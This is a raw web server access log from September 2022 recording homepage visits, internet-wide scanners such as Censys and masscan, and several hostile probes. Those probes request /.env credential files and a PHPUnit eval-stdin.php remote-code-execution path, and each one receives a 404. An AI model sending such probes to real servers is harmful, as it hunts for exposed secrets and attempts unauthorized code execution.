90.151.171.106 - - [11/Sep/2022:17:27:40 +0000] "-" 408 0 "-" "-"
167.94.138.61 - - [11/Sep/2022:17:35:31 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
167.94.138.61 - - [11/Sep/2022:17:35:31 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.61 - - [11/Sep/2022:17:35:31 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
167.94.138.61 - - [11/Sep/2022:17:35:31 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1492 "-" "Go-http-client/1.1"
167.94.138.61 - - [11/Sep/2022:17:35:31 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Go-http-client/1.1"
203.176.137.242 - - [11/Sep/2022:17:58:00 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
172.104.242.173 - - [11/Sep/2022:18:31:13 +0000] "GET /0bef HTTP/1.0" 404 382 "-" "-"
2.183.81.93 - - [11/Sep/2022:19:02:21 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
80.94.92.239 - - [11/Sep/2022:19:10:56 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.84.53.67 - - [11/Sep/2022:19:20:19 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.84.53.67 - - [11/Sep/2022:19:20:19 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.231 - - [11/Sep/2022:19:41:07 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
104.152.52.179 - - [11/Sep/2022:19:55:35 +0000] "GET / HTTP/1.0" 200 2578 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
185.254.196.223 - - [11/Sep/2022:20:14:33 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:20:14:35 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:20:18:56 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:20:23:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.62.191.231 - - [11/Sep/2022:20:23:59 +0000] "GET / HTTP/1.1" 200 2559 "-" "curl/7.64.1"
209.141.35.128 - - [11/Sep/2022:20:24:12 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
